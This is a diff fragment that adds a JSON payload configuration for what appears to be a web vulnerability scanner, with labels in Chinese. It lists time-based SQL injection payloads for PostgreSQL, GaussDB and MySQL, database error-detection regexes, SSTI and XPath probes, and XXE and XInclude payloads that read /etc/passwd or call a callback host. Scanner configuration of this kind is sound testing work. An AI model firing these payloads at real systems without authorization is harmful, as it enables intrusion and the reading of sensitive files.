+          "name": "PostgreSQL 字符串2秒延迟",
+          "kind": "time_delay",
+          "group": "postgres-pg-sleep-string",
+          "payload": "{{value}}' AND (SELECT 731 FROM pg_sleep(2))=731-- ",
+          "expected": "2"
+        },
+        {
+          "name": "GaussDB 零延迟对照",
+          "kind": "time_control",
+          "group": "gaussdb-pg-sleep-and",
+          "payload": "{{value}} AND (SELECT 731 FROM pg_sleep(0))=731",
+          "expected": "2"
+        },
+        {
+          "name": "GaussDB 2秒延迟",
+          "kind": "time_delay",
+          "group": "gaussdb-pg-sleep-and",
+          "payload": "{{value}} AND (SELECT 731 FROM pg_sleep(2))=731",
+          "expected": "2"
+        },
+        {
+          "name": "GaussDB 字符串零延迟对照",
+          "kind": "time_control",
+          "group": "gaussdb-pg-sleep-string",
+          "payload": "{{value}}' AND (SELECT 731 FROM pg_sleep(0))=731-- ",
+          "expected": "2"
+        },
+        {
+          "name": "GaussDB 字符串2秒延迟",
+          "kind": "time_delay",
+          "group": "gaussdb-pg-sleep-string",
+          "payload": "{{value}}' AND (SELECT 731 FROM pg_sleep(2))=731-- ",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-and",
+          "payload": "{{value}} AND SLEEP(0)=0",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 2秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-and",
+          "payload": "{{value}} AND SLEEP(2)=0",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 字符串零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-string",
+          "payload": "{{value}}' AND SLEEP(0)=0-- ",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 字符串2秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-string",
+          "payload": "{{value}}' AND SLEEP(2)=0-- ",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 双引号零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-sleep-double-quote",
+          "payload": "{{value}}\" AND SLEEP(0)=0-- ",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL 双引号2秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-sleep-double-quote",
+          "payload": "{{value}}\" AND SLEEP(2)=0-- ",
+          "expected": "2"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "PostgreSQL/JDBC 异常",
+          "pattern": "(?is)(org\\.postgresql\\.util\\.PSQLException|postgresql.{0,100}(?:error|exception)|PSQLException|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}|unterminated quoted string|syntax error at or near|invalid input syntax for (?:type|integer|numeric|uuid)|operator does not exist.{0,100}|column .{0,80} does not exist)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "GaussDB JDBC/内核异常",
+          "pattern": "(?is)(GaussDB(?:\\s+Kernel)?.{0,120}(?:ERROR|Exception)|com\\.huawei\\.gauss200\\.jdbc|org\\.opengauss\\.util\\.PSQLException|openGauss.{0,120}(?:ERROR|Exception)|GS-[0-9]{5}|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}.{0,180}(?:gauss|openGauss)|(?:gaussdb|opengauss).{0,180}(?:syntax error|invalid input syntax|column .{0,80} does not exist))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MySQL/JDBC 异常",
+          "pattern": "(?is)(com\\.mysql\\.(?:cj\\.)?jdbc\\.(?:exceptions\\.)?(?:MySQLSyntaxErrorException|MysqlDataTruncation|StatementImpl)|MySQLSyntaxErrorException|You have an error in your SQL syntax|check the manual that corresponds to your MySQL server version|Unknown column .{0,100} in|Truncated incorrect .{0,80} value|XPATH syntax error:)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/Spring 数据访问异常",
+          "pattern": "(?is)(org\\.apache\\.ibatis\\.exceptions\\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\\s*Error (?:querying|updating) database|#{3}\\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\\.xml)|java\\.sql\\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "存储过程/CallableStatement 异常",
+          "pattern": "(?is)(CallableStatement.{0,120}(?:Exception|error)|callable statement.{0,120}(?:failed|error)|stored procedure.{0,120}(?:error|exception)|bad SQL grammar.{0,180}(?:call|CallableStatement))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "通用 SQL 语法异常",
+          "pattern": "(?is)(SQL syntax.{0,120}|SQLSTATE\\[|bad SQL grammar|syntax error.{0,100}(?:SQL|query)|database error|query failed)",
+          "severity": "high",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "ssrf": {
+      "parameter_names": [
+        "url",
+        "uri",
+        "link",
+        "callback",
+        "webhook",
+        "redirect",
+        "avatar",
+        "image",
+        "endpoint",
+        "host",
+        "domain",
+        "target"
+      ],
+      "payloads": [
+        {
+          "name": "回连 URL",
+          "payload": "{{callback}}"
+        }
+      ]
+    },
+    "ssti": {
+      "payloads": [
+        {
+          "name": "Jinja/Twig",
+          "payload": "{{7331*3}}",
+          "expected": "21993"
+        },
+        {
+          "name": "EL/Freemarker",
+          "payload": "${7331*3}",
+          "expected": "21993"
+        }
+      ]
+    },
+    "unauthorized": {
+      "payloads": [
+        {
+          "name": "无效会话值",
+          "kind": "invalid_session",
+          "payload": "invalid-scanner-session"
+        }
+      ]
+    },
+    "xpath_injection": {
+      "payloads": [
+        {
+          "name": "XPath 字符串真",
+          "kind": "boolean_true",
+          "group": "xpath-string",
+          "payload": "{{value}}' or '731'='731"
+        },
+        {
+          "name": "XPath 字符串假",
+          "kind": "boolean_false",
+          "group": "xpath-string",
+          "payload": "{{value}}' or '731'='732"
+        },
+        {
+          "name": "XPath 语法破坏",
+          "kind": "error_probe",
+          "payload": "{{value}}'["
+        }
+      ],
+      "patterns": [
+        {
+          "name": "XPath 解析异常",
+          "pattern": "(?is)(XPathExpressionException|XPathException|SAXPathException|Invalid XPath|A location step was expected|javax\\.xml\\.xpath|net\\.sf\\.saxon.{0,120}(?:error|exception)|Unclosed literal in XPath)",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "xxe": {
+      "payloads": [
+        {
+          "name": "内部实体",
+          "kind": "inline",
+          "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE {{root}} [\u003c!ENTITY jungle_happy_scan \"{{token}}\"\u003e]\u003e",
+          "expected": "{{token}}"
+        },
+        {
+          "name": "Linux 文件实体",
+          "kind": "file",
+          "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE {{root}} [\u003c!ENTITY jungle_happy_scan SYSTEM \"file:///etc/passwd\"\u003e]\u003e",
+          "expected": "(?m)^root:x?:0:0:"
+        }
+      ]
+    },
+    "xxe_extended": {
+      "payloads": [
+        {
+          "name": "回连实体",
+          "kind": "callback",
+          "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE {{root}} [\u003c!ENTITY jungle_happy_scan SYSTEM \"{{callback}}\"\u003e]\u003e"
+        },
+        {
+          "name": "XInclude Linux 文件",
+          "kind": "xinclude_file",
+          "payload": "\u003cxi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\" parse=\"text\"/\u003e",
+          "expected": "(?m)^root:x?:0:0:"
+        }
+      ]
+    }
+  }
+}
